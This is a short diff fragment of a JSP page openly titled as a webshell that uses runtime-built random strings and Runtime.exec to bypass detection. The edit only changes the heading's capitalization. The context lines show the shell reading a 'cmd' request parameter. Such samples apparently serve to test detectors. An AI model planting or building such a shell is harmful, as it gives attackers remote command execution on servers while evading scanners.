@@ -7,7 +7,7 @@
 <%@ page import="java.util.Random" %>
 <html>
 <body>
-<h2>利用随机数运行时可知字符串绕过检测的Runtime.exec的JSP Webshell</h2>
+<h2>利用随机数运行时可知字符串绕过检测的Runtime.exec的JSP WebShell</h2>
 <%
     String s2 = request.getParameter("cmd");
     Class rt;
